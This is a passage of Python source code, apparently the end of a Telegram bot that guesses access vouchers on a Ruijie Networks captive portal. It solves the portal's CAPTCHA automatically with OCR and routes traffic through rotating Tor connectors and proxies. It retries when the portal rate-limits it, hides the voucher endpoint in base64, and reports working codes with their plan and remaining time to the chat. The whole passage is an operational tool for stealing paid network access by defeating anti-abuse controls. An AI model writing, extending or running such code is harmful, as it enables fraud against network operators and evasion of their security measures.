            print(f"[get_session_id] status={req.status} final_url={response}")
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                print(f"[get_session_id] found sessionId={session_id.group(1)}")
                return session_id.group(1)
            else:
                print(f"[get_session_id] no sessionId in URL, returning previous={previous_session_id}")
                return previous_session_id
    except Exception as e:
        print(f"[get_session_id] ERROR url={session_url[:80]} exception={type(e).__name__}: {e}")
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

SESSION_POOL_LIMIT = 60
SESSION_POOL_SLOTS = 10

async def get_pooled_session_id(chat_id, task_session, session_url):
    if chat_id not in _session_pool:
        _session_pool[chat_id] = {
            "slots": [{"session_id": None, "uses": 0, "lock": asyncio.Lock()} for _ in range(SESSION_POOL_SLOTS)],
            "rr": 0
        }
    pool = _session_pool[chat_id]

    # Round-robin: find any slot with remaining capacity
    for i in range(SESSION_POOL_SLOTS):
        idx = (pool["rr"] + i) % SESSION_POOL_SLOTS
        entry = pool["slots"][idx]
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            pool["rr"] = (idx + 1) % SESSION_POOL_SLOTS
            entry["uses"] += 1
            return entry["session_id"]

    # All slots exhausted — refresh the next slot (non-blocking for others)
    idx = pool["rr"] % SESSION_POOL_SLOTS
    pool["rr"] = (pool["rr"] + 1) % SESSION_POOL_SLOTS
    entry = pool["slots"][idx]
    async with entry["lock"]:
        if entry["session_id"] and entry["uses"] < SESSION_POOL_LIMIT:
            entry["uses"] += 1
            return entry["session_id"]
        new_sid = await get_session_id(task_session, session_url, entry["session_id"])
        if new_sid:
            entry["session_id"] = new_sid
            entry["uses"] = 1
            print(f"[session-pool] chat={chat_id} slot={idx} new sessionId={new_sid}")
        return entry["session_id"]

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    for _attempt in range(3):
        timeout = aiohttp.ClientTimeout(total=60 if proxy_enabled else 30)
        conn = _next_tor_connector()

        async with aiohttp.ClientSession(
            connector=conn,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as task_session:

            session_id = await get_pooled_session_id(chat_id, task_session, session_url)
            if not session_id:
                return

            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except Exception as e:
                    print(f"[perform_check] captcha error: {e}")
            if not auth_code:
                return

            if not recheck:
                current_task = scan_tasks.get(chat_id)
                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                    return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "referer": (
                    f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                ),
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return

        if response and 'request limited' in response:
            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id, task_session)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        code_line = format_success_results(success_texts[chat_id])
        await SUCCESS_CODE.put({
            "chat_id": chat_id,
            "code": code
        })
        # Found codes are rendered under the scanner status message by
        # _flush_progress(), keeping the scan UI in one message.
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id, task_session)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Limited Codes:\n\n{limited_line}"
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except Exception as e:
                        try:
                            sent = await bot.send_message(
                                chat_id=message.chat.id,
                                text=f"Limited Codes:\n\n{limited_line}"
                            )
                            limited_messages[chat_id] = sent.message_id
                        except Exception as err:
                            print(f"Limited Fallback Error: {err}")
            except Exception as e:
                print(f"Limited Message Error: {e}")

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    hours = int(total_minutes) // 60
    minutes = int(total_minutes) % 60
    if hours > 0 and minutes > 0:
        return f"{hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h"
    else:
        return f"{minutes}m"

async def Code_Expires_Date(session_id, request_session=None):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId=04ecdc104a99406194f594057b21fd21&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    async def _fetch(active_session):
        async with active_session.get(
            f"https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}",
            headers=headers
        ) as req:
            respond = await req.json(content_type=None)
            profile_name = respond.get('result', {}).get('profileName', 'Unknown')
            totaltime = Minute_to_Hour(respond.get('result', {}).get('totalMinutes', 'Unknown'))
            return f"📋 Plan: {profile_name} | ⏳ Time: {totaltime}"

    try:
        # Keep the same proxy, cookies, and authenticated session used by the
        # voucher request when reading the balance details.
        if request_session is not None and not request_session.closed:
            return await _fetch(request_session)

        timeout = aiohttp.ClientTimeout(total=15)
        conn = _next_tor_connector() if proxy_enabled else aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(
            connector=conn,
            connector_owner=False if proxy_enabled else True,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            return await _fetch(fresh_session)
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        return "📋 Plan: Unknown | ⏳ Time: Unknown"


_ocr = ddddocr.DdddOcr(show_ad=False)
_ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=32)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_ocr_executor, _ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'image',
        'sec-fetch-mode': 'no-cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {
        'sessionId': session_id,
        '_t': str(time.time()),
    }
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {
        'sessionId': session_id,
        'authCode': text,
    }
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
        if data.get("success") == True:
            return session_id
        else:
            return None


async def start_polling():
    backoff = 5
    while True:
        try:
            print("[polling] Starting infinity_polling...")
            await bot.infinity_polling(timeout=20, request_timeout=35)
            print("[polling] infinity_polling exited cleanly, restarting...")
            await asyncio.sleep(2)
            backoff = 5
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"[polling] Connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"[polling] Unexpected error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global proxy_enabled
    saved_proxies = await load_custom_proxies()
    _custom_proxy_urls[:] = saved_proxies
    if saved_proxies:
        print(f"[github] Loaded {len(saved_proxies)} custom proxies from {PROXY_FILE}")
    await rebuild_session(
        use_proxy=bool(saved_proxies),
        proxy_urls=saved_proxies,
    )
    proxy_enabled = bool(saved_proxies)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        if session and not session.closed:
            await session.close()
        if _connector and not _connector.closed:
            await _connector.close()
        for c in _tor_connectors:
            if not c.closed:
                await c.close()
        for p in _tor_processes:
            try:
                if p.returncode is None:
                    p.terminate()
            except Exception:
                pass

if __name__ == '__main__':
    asyncio.run(main())
